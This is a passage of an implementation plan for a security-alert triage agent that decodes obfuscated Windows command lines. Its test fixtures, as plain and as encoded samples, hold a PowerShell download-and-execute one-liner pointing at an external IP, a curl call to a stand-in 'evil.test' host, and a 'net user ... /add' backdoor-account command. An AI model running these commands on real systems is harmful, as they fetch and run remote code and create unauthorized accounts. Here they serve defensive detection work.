# Command-Line Execution Alert Investigation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the Agentic Analyst to investigate Windows Sysmon Event ID 1 (process creation) alerts — decoding common command-line obfuscation (base64, PowerShell `-EncodedCommand`, hex, URL-encoding) so hidden indicators reach the existing extraction pipeline, with no new LLM call.

**Architecture:** One new composite `Alert.process` field populated by a small, appendable list of decoder-specific extractor functions (Sysmon-only for now); a new pure decode module folded into the existing Extract Indicators step as an early phase; bounded, already-decoded command context threaded into the existing Risk Assessment / Draft Report / Self-Check prompts as an additional optional parameter, with the model reasoning about suspiciousness freely in its existing free-text output rather than through a closed pattern catalog.

**Tech Stack:** Same as the rest of the project — Pydantic schemas, Ollama-backed `LLMClient.generate_structured`, pytest.

## Global Constraints

- **No new LLM call.** The 6-fixed-calls-plus-1-conditional budget (CLAUDE.md §4.1) is unchanged — command context is added as bounded input to existing calls only.
- **Trigger condition is data presence, not rule identity.** Every check in this feature is `alert.process is not None` (or a field on it) — never a rule ID, rule group, or event ID check.
- **Decode is 100% deterministic.** No LLM-assisted deobfuscation, no closed-vocabulary suspicious-pattern/LOLBin catalog. The model reasons about suspiciousness freely in `rationale`/`alert_summary` prose; closed-vocab decision outputs (`severity`, `confidence`, `recommended_actions`) are unaffected.
- **Backward-compatible signatures.** Every changed function signature adds its new parameter as a trailing, defaulted (`= None`) parameter — never reorders or removes an existing parameter. This is deliberate: it means the majority of already-passing tests in `tests/test_state_graph.py` need zero changes, since they call these functions without the new parameter and get the pre-existing behavior by default. Only call sites that change return *arity* (see `_step_extract_indicators` in Task 4) require test updates.
- **Printable-ratio gate.** Every decode attempt (base64, hex) is accepted only if the decoded text is ≥90% printable characters; otherwise it's discarded, not corrected or retried, and counted (not detailed) in the timeline summary — mirrors the existing indicator-extraction merge-gate pattern ("N proposed, M validated, K discarded").
- **Command context is capped at 500 characters per field** in prompts (`_COMMAND_CONTEXT_CHAR_CAP` in `app/agent/prompts.py`) to keep prompts bounded per CLAUDE.md §4.2 rule 2.
- **Layering:** `ProcessExecutionFields`, `DecodedSegment`, `CommandDecodeResult` live in `app/schemas.py` (not `app/agent/schemas.py`), because `Report` (also in `app/schemas.py`) references `CommandDecodeResult` and the codebase's existing import direction is `app/agent/*` → `app/schemas.py`, never the reverse.

---

### Task 1: Data model — `ProcessExecutionFields`, `DecodedSegment`, `CommandDecodeResult`, and the new `Alert`/`Report` fields

**Files:**
- Modify: `app/schemas.py`
- Test: `tests/test_schemas.py`

**Interfaces:**
- Produces: `ProcessExecutionFields(command_line, parent_command_line, process_name, parent_process_name, process_id, parent_process_id, process_hashes)` — all `str | None`, all default `None`. `DecodedSegment(encoding: Literal["powershell_encoded", "base64", "hex", "url"], original: str, decoded: str)`. `CommandDecodeResult(command_line: str | None, parent_command_line: str | None, decoded_segments: list[DecodedSegment])`. `Alert.process: ProcessExecutionFields | None = None`. `Report.command_analysis: CommandDecodeResult | None = None`.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_schemas.py`, right after `test_mitre_ref_requires_all_fields` (around line 56):

```python
from app.schemas import CommandDecodeResult, DecodedSegment, ProcessExecutionFields


def test_process_execution_fields_all_optional():
    fields = ProcessExecutionFields()
    assert fields.command_line is None
    assert fields.process_hashes is None


def test_decoded_segment_requires_encoding_original_decoded():
    segment = DecodedSegment(encoding="base64", original="Zm9v", decoded="foo")
    assert segment.encoding == "base64"
    with pytest.raises(ValidationError):
        DecodedSegment(encoding="not_a_real_encoding", original="Zm9v", decoded="foo")


def test_command_decode_result_defaults_empty_segments():
    result = CommandDecodeResult(command_line="powershell.exe -enc AAA")
    assert result.decoded_segments == []
    assert result.parent_command_line is None
```

Add right after `test_alert_accepts_optional_network_fields` (around line 95):

```python
def test_alert_process_defaults_to_none():
    alert = _make_alert()
    assert alert.process is None


def test_alert_accepts_process_execution_fields():
    alert = _make_alert(process=ProcessExecutionFields(command_line="powershell.exe -enc AAA"))
    assert alert.process.command_line == "powershell.exe -enc AAA"
```

Add right after `test_report_triage_experimental_fields_default_to_none` (around line 160):

```python
def test_report_command_analysis_defaults_to_none():
    report = _make_report()
    assert report.command_analysis is None


def test_report_accepts_command_analysis():
    analysis = CommandDecodeResult(
        command_line="powershell.exe -enc AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami")],
    )
    report = _make_report(command_analysis=analysis)
    assert report.command_analysis.decoded_segments[0].decoded == "whoami"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_schemas.py -v`
Expected: FAIL with `ImportError: cannot import name 'CommandDecodeResult'` (and similar) — none of these names exist yet.

- [ ] **Step 3: Add the new schemas to `app/schemas.py`**

Add `Literal` to the existing `typing` import (line 2): `from typing import Any, Literal`.

Add right after `MitreRef` (after line 59, before `class Alert`):

```python
class ProcessExecutionFields(BaseModel):
    command_line: str | None = None
    parent_command_line: str | None = None
    process_name: str | None = None
    parent_process_name: str | None = None
    process_id: str | None = None
    parent_process_id: str | None = None
    process_hashes: str | None = None
```

Add `process: ProcessExecutionFields | None = None` as the last field of `Alert` (after `status: AlertStatus = AlertStatus.NEW`, line 85).

Add right after `ModelMetadata` (after line 118, before `class Report`):

```python
class DecodedSegment(BaseModel):
    encoding: Literal["powershell_encoded", "base64", "hex", "url"]
    original: str
    decoded: str


class CommandDecodeResult(BaseModel):
    command_line: str | None = None
    parent_command_line: str | None = None
    decoded_segments: list[DecodedSegment] = Field(default_factory=list)
```

Add `command_analysis: CommandDecodeResult | None = None` as the last field of `Report` (after `model_metadata: ModelMetadata`, line 135).

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_schemas.py -v`
Expected: all PASS.

- [ ] **Step 5: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS (purely additive optional fields; nothing existing constructs `Alert`/`Report` with a fixed positional-arg count that this would break — both are already built with keyword args everywhere in the codebase).

- [ ] **Step 6: Commit**

```bash
git add app/schemas.py tests/test_schemas.py
git commit -m "feat: add ProcessExecutionFields, DecodedSegment, CommandDecodeResult schemas"
```

---

### Task 2: Sysmon process-field extractor

**Files:**
- Create: `app/integration/process_field_extractors.py`
- Modify: `app/integration/wazuh_connector.py`
- Test: `tests/test_process_field_extractors.py` (new)
- Test: `tests/test_wazuh_alert_mapper.py`

**Interfaces:**
- Consumes: `ProcessExecutionFields` from `app.schemas` (Task 1).
- Produces: `extract_process_fields(data: dict[str, Any]) -> ProcessExecutionFields | None` — tried by `wazuh_source_to_alert()` to populate `Alert.process`. A future decoder is added by writing one new `_extract_*_fields` function and appending it to `_EXTRACTORS`.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_process_field_extractors.py`:

```python
from app.integration.process_field_extractors import extract_process_fields


def test_extracts_sysmon_process_fields():
    data = {
        "win": {
            "eventdata": {
                "commandLine": "powershell.exe -enc AAA",
                "parentCommandLine": "explorer.exe",
                "image": "powershell.exe",
                "parentImage": "explorer.exe",
                "processId": "100",
                "parentProcessId": "50",
                "hashes": "MD5=abc,SHA256=def",
            }
        }
    }

    fields = extract_process_fields(data)

    assert fields is not None
    assert fields.command_line == "powershell.exe -enc AAA"
    assert fields.parent_command_line == "explorer.exe"
    assert fields.process_name == "powershell.exe"
    assert fields.parent_process_name == "explorer.exe"
    assert fields.process_id == "100"
    assert fields.parent_process_id == "50"
    assert fields.process_hashes == "MD5=abc,SHA256=def"


def test_returns_none_when_no_command_line():
    assert extract_process_fields({"win": {"eventdata": {}}}) is None


def test_returns_none_for_non_sysmon_data_shape():
    assert extract_process_fields({"srcip": "203.0.113.5"}) is None


def test_returns_none_for_empty_data():
    assert extract_process_fields({}) is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_process_field_extractors.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.integration.process_field_extractors'`.

- [ ] **Step 3: Create `app/integration/process_field_extractors.py`**

```python
from typing import Any, Callable

from app.schemas import ProcessExecutionFields


def _extract_sysmon_fields(data: dict[str, Any]) -> ProcessExecutionFields | None:
    eventdata = data.get("win", {}).get("eventdata", {})
    command_line = eventdata.get("commandLine")
    if not command_line:
        return None
    return ProcessExecutionFields(
        command_line=command_line,
        parent_command_line=eventdata.get("parentCommandLine"),
        process_name=eventdata.get("image"),
        parent_process_name=eventdata.get("parentImage"),
        process_id=eventdata.get("processId"),
        parent_process_id=eventdata.get("parentProcessId"),
        process_hashes=eventdata.get("hashes"),
    )


_EXTRACTORS: list[Callable[[dict[str, Any]], ProcessExecutionFields | None]] = [_extract_sysmon_fields]


def extract_process_fields(data: dict[str, Any]) -> ProcessExecutionFields | None:
    for extractor in _EXTRACTORS:
        result = extractor(data)
        if result is not None:
            return result
    return None
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_process_field_extractors.py -v`
Expected: all PASS.

- [ ] **Step 5: Wire into `wazuh_source_to_alert`**

In `app/integration/wazuh_connector.py`, add the import after the existing `from app.integration.models import ...` line (line 10):

```python
from app.integration.process_field_extractors import extract_process_fields
```

In `wazuh_source_to_alert` (around line 62), add `process=extract_process_fields(data),` as the last keyword argument to the `Alert(...)` constructor, right after `raw_json=source,`.

- [ ] **Step 6: Write the failing mapper tests**

Add to `tests/test_wazuh_alert_mapper.py`, right after `SYSLOG_EXAMPLE_SOURCE` (after line 43):

```python
# A Sysmon Event ID 1 (process creation) alert, with an encoded PowerShell command line.
SYSMON_PROCESS_CREATION_SOURCE = {
    "agent": {"ip": "172.20.10.5", "name": "WIN-DESKTOP01", "id": "003"},
    "manager": {"name": "wazuh-manager"},
    "data": {
        "win": {
            "system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
            "eventdata": {
                "utcTime": "2026-08-13 10:15:00.000",
                "processId": "4820",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "commandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                "parentProcessId": "3344",
                "parentImage": "C:\\Windows\\explorer.exe",
                "parentCommandLine": "C:\\Windows\\explorer.exe",
                "hashes": "MD5=44D88612FEA8A8F36DE82E1278ABB02F,SHA256=" + "a" * 64,
                "user": "WIN-DESKTOP01\\alice",
            },
        }
    },
    "rule": {
        "level": 12,
        "description": "Sysmon - Process creation via encoded PowerShell command",
        "groups": ["windows", "sysmon"],
        "id": "92009",
    },
    "location": "EventChannel",
    "full_log": "",
    "id": "1700000000.987654",
    "timestamp": "2026-08-13T10:15:00.000+0000",
}


def test_maps_sysmon_process_creation_fields():
    alert = wazuh_source_to_alert(SYSMON_PROCESS_CREATION_SOURCE)

    assert alert.process is not None
    assert alert.process.command_line == "powershell.exe -EncodedCommand SQBFAFgA"
    assert alert.process.parent_command_line == "C:\\Windows\\explorer.exe"
    assert alert.process.process_name == "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    assert alert.process.parent_process_name == "C:\\Windows\\explorer.exe"
    assert alert.process.process_id == "4820"
    assert alert.process.parent_process_id == "3344"
    assert alert.process.process_hashes == "MD5=44D88612FEA8A8F36DE82E1278ABB02F,SHA256=" + "a" * 64


def test_process_is_none_for_non_sysmon_alert():
    alert = wazuh_source_to_alert(SYSLOG_EXAMPLE_SOURCE)

    assert alert.process is None
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `pytest tests/test_wazuh_alert_mapper.py tests/test_process_field_extractors.py -v`
Expected: all PASS.

- [ ] **Step 8: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 9: Commit**

```bash
git add app/integration/process_field_extractors.py app/integration/wazuh_connector.py tests/test_process_field_extractors.py tests/test_wazuh_alert_mapper.py
git commit -m "feat: extract Sysmon process-execution fields into Alert.process"
```

---

### Task 3: Command decode module

**Files:**
- Create: `app/agent/command_decode.py`
- Test: `tests/test_command_decode.py` (new)

**Interfaces:**
- Consumes: `ProcessExecutionFields`, `DecodedSegment` from `app.schemas` (Task 1).
- Produces: `decode_command_segments(process: ProcessExecutionFields) -> tuple[list[DecodedSegment], int, int]` (segments, attempted count, discarded count) — consumed by Task 4's `_step_extract_indicators`.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_command_decode.py`:

```python
from app.agent.command_decode import decode_command_segments
from app.schemas import ProcessExecutionFields

_PS_PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')"
_PS_B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"


def test_decodes_powershell_encoded_command():
    process = ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {_PS_B64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert len(segments) == 1
    assert segments[0].encoding == "powershell_encoded"
    assert segments[0].decoded == _PS_PAYLOAD


def test_decodes_generic_base64_blob():
    b64 = "Y21kLmV4ZSAvYyB3aG9hbWkgJiYgY3VybCBodHRwOi8vZXZpbC50ZXN0L3g="
    process = ProcessExecutionFields(command_line=f"rundll32.exe shell32.dll,ShellExec_RunDLL {b64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert segments[0].encoding == "base64"
    assert segments[0].decoded == "cmd.exe /c whoami && curl http://evil.test/x"


def test_decodes_hex_blob():
    hex_blob = "6e65742075736572206861636b657220506173737730726421202f616464"
    process = ProcessExecutionFields(command_line=f"certutil.exe -decodehex {hex_blob}")

    segments, attempted, discarded = decode_command_segments(process)

    # the same span also matches the base64-alphabet scanner (hex digits are a subset
    # of base64's alphabet); that attempt decodes to non-printable garbage and is
    # discarded before the hex scanner gets a chance at the same (unconsumed) span.
    assert attempted == 2
    assert discarded == 1
    assert len(segments) == 1
    assert segments[0].encoding == "hex"
    assert segments[0].decoded == "net user hacker Passw0rd! /add"


def test_decodes_url_encoded_segment():
    process = ProcessExecutionFields(command_line="cmd.exe /c echo %68%65%6c%6c%6f")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert segments[0].encoding == "url"
    assert segments[0].decoded == "cmd.exe /c echo hello"


def test_plain_command_line_produces_no_segments():
    process = ProcessExecutionFields(command_line="notepad.exe C:\\Users\\alice\\Documents\\report.txt")

    segments, attempted, discarded = decode_command_segments(process)

    assert segments == []
    assert attempted == 0
    assert discarded == 0


def test_discards_base64_shaped_token_that_decodes_to_non_printable_garbage():
    process = ProcessExecutionFields(command_line="foo.exe aGVsbG8gd29scmxkYWJjZGVmZ2hpamsQ1w2Zg==")

    segments, attempted, discarded = decode_command_segments(process)

    assert segments == []
    assert attempted == 1
    assert discarded == 1


def test_scans_parent_command_line_too():
    b64 = "Y21kLmV4ZSAvYyB3aG9hbWkgJiYgY3VybCBodHRwOi8vZXZpbC50ZXN0L3g="
    process = ProcessExecutionFields(command_line="notepad.exe", parent_command_line=f"cmd.exe /c {b64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert len(segments) == 1
    assert segments[0].decoded == "cmd.exe /c whoami && curl http://evil.test/x"


def test_returns_empty_when_no_command_lines_set():
    segments, attempted, discarded = decode_command_segments(ProcessExecutionFields())

    assert segments == []
    assert attempted == 0
    assert discarded == 0
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_command_decode.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.agent.command_decode'`.

- [ ] **Step 3: Create `app/agent/command_decode.py`**

```python
import base64
import binascii
import re
import urllib.parse

from app.schemas import DecodedSegment, ProcessExecutionFields

_POWERSHELL_ENCODED_RE = re.compile(r"-e(?:nc(?:odedcommand)?)?\s+([A-Za-z0-9+/=]{20,})", re.IGNORECASE)
_BASE64_RE = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")
_HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2}){10,}")
_URL_ENCODED_RE = re.compile(r"%[0-9A-Fa-f]{2}")

_PRINTABLE_RATIO_THRESHOLD = 0.9


def _printable_ratio(text: str) -> float:
    if not text:
        return 0.0
    printable = sum(1 for c in text if c.isprintable() or c in "\r\n\t")
    return printable / len(text)


def _try_decode_base64(token: str) -> str | None:
    try:
        raw = base64.b64decode(token, validate=True)
    except (binascii.Error, ValueError):
        return None
    for encoding in ("utf-16-le", "utf-8"):
        try:
            decoded = raw.decode(encoding)
        except UnicodeDecodeError:
            continue
        if _printable_ratio(decoded) >= _PRINTABLE_RATIO_THRESHOLD:
            return decoded
    return None


def _try_decode_hex(token: str) -> str | None:
    try:
        raw = bytes.fromhex(token)
    except ValueError:
        return None
    try:
        decoded = raw.decode("utf-8")
    except UnicodeDecodeError:
        return None
    if _printable_ratio(decoded) >= _PRINTABLE_RATIO_THRESHOLD:
        return decoded
    return None


def _overlaps(start: int, end: int, consumed: list[tuple[int, int]]) -> bool:
    return any(start < c_end and end > c_start for c_start, c_end in consumed)


def _decode_text(text: str) -> tuple[list[DecodedSegment], int, int]:
    segments: list[DecodedSegment] = []
    attempted = 0
    discarded = 0
    consumed: list[tuple[int, int]] = []

    for match in _POWERSHELL_ENCODED_RE.finditer(text):
        attempted += 1
        token = match.group(1)
        decoded = _try_decode_base64(token)
        if decoded is None:
            discarded += 1
            continue
        consumed.append(match.span(1))
        segments.append(DecodedSegment(encoding="powershell_encoded", original=token, decoded=decoded))

    for match in _BASE64_RE.finditer(text):
        start, end = match.span()
        if _overlaps(start, end, consumed):
            continue
        attempted += 1
        decoded = _try_decode_base64(match.group())
        if decoded is None:
            discarded += 1
            continue
        consumed.append((start, end))
        segments.append(DecodedSegment(encoding="base64", original=match.group(), decoded=decoded))

    for match in _HEX_RE.finditer(text):
        start, end = match.span()
        if _overlaps(start, end, consumed):
            continue
        attempted += 1
        decoded = _try_decode_hex(match.group())
        if decoded is None:
            discarded += 1
            continue
        consumed.append((start, end))
        segments.append(DecodedSegment(encoding="hex", original=match.group(), decoded=decoded))

    if _URL_ENCODED_RE.search(text):
        attempted += 1
        decoded = urllib.parse.unquote(text)
        if decoded != text and _printable_ratio(decoded) >= _PRINTABLE_RATIO_THRESHOLD:
            segments.append(DecodedSegment(encoding="url", original=text, decoded=decoded))
        else:
            discarded += 1

    return segments, attempted, discarded


def decode_command_segments(process: ProcessExecutionFields) -> tuple[list[DecodedSegment], int, int]:
    segments: list[DecodedSegment] = []
    attempted = 0
    discarded = 0
    for text in (process.command_line, process.parent_command_line):
        if not text:
            continue
        seg, att, disc = _decode_text(text)
        segments.extend(seg)
        attempted += att
        discarded += disc
    return segments, attempted, discarded
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_command_decode.py -v`
Expected: all PASS.

- [ ] **Step 5: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 6: Commit**

```bash
git add app/agent/command_decode.py tests/test_command_decode.py
git commit -m "feat: add deterministic command-line decoding (base64, PowerShell -enc, hex, URL)"
```

---

### Task 4: Wire decode into Extract Indicators

**Files:**
- Modify: `app/agent/indicator_extraction.py`
- Modify: `app/agent/state_graph.py`
- Test: `tests/test_indicator_extraction.py`
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Consumes: `decode_command_segments` from `app.agent.command_decode` (Task 3); `CommandDecodeResult` from `app.schemas` (Task 1).
- Produces: `extract_and_validate(alert, extra_texts=None)` — new optional parameter. `AgenticAnalyst._step_extract_indicators(alert, model_available) -> tuple[list[Indicator], CommandDecodeResult | None, InvestigationStep]` — **return arity changes from 2-tuple to 3-tuple**, so every existing caller must be updated (Steps 6-7 below).

- [ ] **Step 1: Write the failing test for `extra_texts`**

Add to `tests/test_indicator_extraction.py`, right after `test_extract_and_validate_scans_string_values_in_data_field` (around line 84):

```python
def test_extract_and_validate_scans_extra_texts():
    alert = _make_alert(full_log="no indicators in the log line")

    validated, candidate_count, validated_count = extract_and_validate(
        alert, extra_texts=["decoded payload contacting 198.51.100.7"]
    )

    assert candidate_count == 1
    assert validated_count == 1
    assert validated[0].value == "198.51.100.7"


def test_extract_and_validate_ignores_empty_extra_texts_by_default():
    alert = _make_alert(full_log="203.0.113.5 contacted 203.0.113.5 again")

    validated, candidate_count, validated_count = extract_and_validate(alert)

    assert candidate_count == 2
    assert validated_count == 1
```

- [ ] **Step 2: Run tests to verify the first one fails**

Run: `pytest tests/test_indicator_extraction.py -v`
Expected: `test_extract_and_validate_scans_extra_texts` FAILS with `TypeError: extract_and_validate() got an unexpected keyword argument 'extra_texts'`. The second test already passes (it's here to lock in that omitting `extra_texts` doesn't change existing behavior).

- [ ] **Step 3: Add `extra_texts` to `extract_and_validate`**

In `app/agent/indicator_extraction.py`, change the signature and first line of the function body (currently lines 23-24):

```python
def extract_and_validate(alert: Alert, extra_texts: list[str] | None = None) -> tuple[list[Indicator], int, int]:
    text_sources = [alert.full_log] + [v for v in alert.data.values() if isinstance(v, str)] + list(extra_texts or [])
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_indicator_extraction.py -v`
Expected: all PASS.

- [ ] **Step 5: Update `_step_extract_indicators` to decode and orchestrate**

In `app/agent/state_graph.py`, add imports (near the top, alongside the existing `from app.agent.indicator_extraction import extract_and_validate` on line 9):

```python
from app.agent.command_decode import decode_command_segments
```

Add `CommandDecodeResult` to the existing `from app.schemas import (...)` block (line 37-50).

Add a module-level helper function right after `_merge_indicators` (after line 71, before `_compute_uncertainty_notes`):

```python
def _decode_command(alert: Alert) -> tuple[CommandDecodeResult | None, int, int]:
    if alert.process is None:
        return None, 0, 0
    segments, attempted, discarded = decode_command_segments(alert.process)
    return (
        CommandDecodeResult(
            command_line=alert.process.command_line,
            parent_command_line=alert.process.parent_command_line,
            decoded_segments=segments,
        ),
        attempted,
        discarded,
    )


def _command_extra_texts(alert: Alert, command_decode_result: CommandDecodeResult | None) -> list[str]:
    if alert.process is None:
        return []
    texts = [alert.process.command_line, alert.process.parent_command_line, alert.process.process_hashes]
    if command_decode_result is not None:
        texts.extend(segment.decoded for segment in command_decode_result.decoded_segments)
    return [t for t in texts if t]
```

Replace `_step_extract_indicators` (lines 179-232) in full:

```python
    def _step_extract_indicators(
        self, alert: Alert, model_available: bool
    ) -> tuple[list[Indicator], CommandDecodeResult | None, InvestigationStep]:
        logger.debug(
            "_step_extract_indicators input: alert_id=%s, model_available=%s", alert.alert_id, model_available
        )
        command_decode_result, decode_attempted, decode_discarded = _decode_command(alert)
        decode_note = ""
        if command_decode_result is not None:
            decode_note = (
                f"; command decode: {len(command_decode_result.decoded_segments)} segment(s) decoded, "
                f"{decode_discarded} discarded"
            )
        extra_texts = _command_extra_texts(alert, command_decode_result)

        validated, candidate_count, validated_count = extract_and_validate(alert, extra_texts=extra_texts)

        if not model_available:
            step = InvestigationStep(
                step_name=Step.EXTRACT_INDICATORS.value,
                action="completed",
                tool_used="regex_extraction",
                input=None,
                output_summary=(
                    f"regex: {candidate_count} candidates, {validated_count} validated{decode_note} "
                    "(LLM-assisted extraction skipped: model unavailable)"
                ),
                timestamp=datetime.now(timezone.utc),
            )
            logger.debug(
                "_step_extract_indicators output: %s indicator(s): %s",
                len(validated), [(type(i).__name__, i.value) for i in validated],
            )
            return validated, command_decode_result, step

        llm_validated, llm_candidate_count, llm_validated_count, llm_error = self._extract_indicators_via_llm(alert)
        merged = _merge_indicators(validated, llm_validated)

        if llm_error is not None:
            self._degraded_reasons.append(f"indicator extraction LLM failed: {llm_error}")
            summary = (
                f"regex: {candidate_count} candidates, {validated_count} validated{decode_note}; "
                f"LLM-assisted extraction failed: {llm_error}"
            )
        else:
            summary = (
                f"regex: {candidate_count} candidates, {validated_count} validated{decode_note}; "
                f"LLM: {llm_candidate_count} candidates, {llm_validated_count} validated"
            )

        step = InvestigationStep(
            step_name=Step.EXTRACT_INDICATORS.value,
            action="completed",
            tool_used="regex_extraction+llm_extraction",
            input=None,
            output_summary=summary,
            timestamp=datetime.now(timezone.utc),
        )
        logger.debug(
            "_step_extract_indicators output: %s indicator(s): %s",
            len(merged), [(type(i).__name__, i.value) for i in merged],
        )
        return merged, command_decode_result, step
```

Note `decode_note` is `""` whenever `alert.process is None` (the vast majority of existing tests), so every existing `output_summary` substring assertion (e.g. `"regex: 1 candidates, 1 validated"`) still matches exactly — string content is unchanged for non-process alerts.

- [ ] **Step 6: Update `investigate()`'s call site**

In `investigate()` (around line 721), change:

```python
        indicators, extract_step = self._step_extract_indicators(alert, model_available)
```

to:

```python
        indicators, command_decode_result, extract_step = self._step_extract_indicators(alert, model_available)
```

(`command_decode_result` is unused further until Task 8 — that's expected at this point in the plan.)

- [ ] **Step 7: Update every existing test call site in `tests/test_state_graph.py`**

Change each of these lines (the return arity changed from 2 to 3):

- Line 208: `indicators, step = analyst._step_extract_indicators(alert, model_available=False)` → `indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)`
- Line 220: same pattern → `indicators, _, step = ...`
- Line 230: `_, step = analyst._step_extract_indicators(alert, model_available=False)` → `_, _, step = analyst._step_extract_indicators(alert, model_available=False)`
- Line 247: `indicators, step = analyst._step_extract_indicators(alert, model_available=True)` → `indicators, _, step = ...`
- Line 266: same pattern → `indicators, _, step = ...`
- Line 277: same pattern → `indicators, _, step = ...`
- Line 288-289 (inside `test_step_enrich_calls_registry_for_each_indicator`): `indicators, _ = analyst._step_extract_indicators(...)` → `indicators, _, _ = analyst._step_extract_indicators(...)`
- Line 1197-1198 (inside `test_step_enrich_degrades_when_no_provider_registered_for_type`): same pattern → `indicators, _, _ = ...`
- Line 1369-1370 (inside `test_step_enrich_logs_input_and_output`): same pattern → `indicators, _, _ = ...`

`test_step_extract_indicators_logs_input_and_output` (line 1352-1362) doesn't unpack the return value at all — no change needed there.

- [ ] **Step 8: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 9: Write the new end-to-end regression + feature test**

Add to `tests/test_state_graph.py`, right after `test_step_extract_indicators_keeps_regex_results_when_llm_call_fails` (around line 282):

```python
def test_step_extract_indicators_decodes_and_extracts_ioc_from_encoded_command():
    from app.schemas import ProcessExecutionFields

    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
    analyst = _make_analyst()
    alert = _make_alert(
        full_log="",
        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
    )

    indicators, command_decode_result, step = analyst._step_extract_indicators(alert, model_available=False)

    assert any(i.value == "185.220.101.1" for i in indicators)
    assert command_decode_result is not None
    assert len(command_decode_result.decoded_segments) == 1
    assert "command decode: 1 segment(s) decoded, 0 discarded" in step.output_summary


def test_step_extract_indicators_returns_none_command_decode_result_when_no_process_fields():
    analyst = _make_analyst()
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    _, command_decode_result, _ = analyst._step_extract_indicators(alert, model_available=False)

    assert command_decode_result is None
```

- [ ] **Step 10: Run the new tests to verify they pass**

Run: `pytest tests/test_state_graph.py -k "decodes_and_extracts_ioc or returns_none_command_decode_result" -v`
Expected: both PASS.

- [ ] **Step 11: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 12: Commit**

```bash
git add app/agent/indicator_extraction.py app/agent/state_graph.py tests/test_indicator_extraction.py tests/test_state_graph.py
git commit -m "feat: decode command-line obfuscation before indicator extraction"
```

---

### Task 5: `RecommendedAction` catalog additions

**Files:**
- Modify: `app/agent/schemas.py`
- Test: `tests/test_agent_schemas.py`

**Interfaces:**
- Produces: three new `RecommendedAction` enum members — `TERMINATE_SUSPICIOUS_PROCESS`, `REVIEW_PROCESS_EXECUTION_TREE`, `REVIEW_DECODED_COMMAND_PAYLOAD`.

- [ ] **Step 1: Write the failing test**

Add to `tests/test_agent_schemas.py` (check the file first for its exact `RecommendedAction`-membership test pattern and add alongside it; if no such test exists yet, add this near the top):

```python
def test_recommended_action_includes_process_execution_entries():
    values = {a.value for a in RecommendedAction}
    assert "Terminate the suspicious process on the affected host" in values
    assert "Review the parent-child process execution tree for the affected host" in values
    assert "Manually review the decoded command payload for malicious intent" in values
```

(Add `RecommendedAction` to that file's existing import from `app.agent.schemas` if it isn't already imported.)

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_agent_schemas.py -k recommended_action_includes_process -v`
Expected: FAIL — an `AssertionError` since none of the three strings exist in the enum yet.

- [ ] **Step 3: Add the three enum members**

In `app/agent/schemas.py`, add these three lines to `RecommendedAction` (after line 57, `ESCALATE_TO_HUMAN_ANALYST = ...`):

```python
    TERMINATE_SUSPICIOUS_PROCESS = "Terminate the suspicious process on the affected host"
    REVIEW_PROCESS_EXECUTION_TREE = "Review the parent-child process execution tree for the affected host"
    REVIEW_DECODED_COMMAND_PAYLOAD = "Manually review the decoded command payload for malicious intent"
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_agent_schemas.py -v`
Expected: all PASS.

- [ ] **Step 5: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS (adding enum members never breaks existing `RecommendedAction.X` references).

- [ ] **Step 6: Commit**

```bash
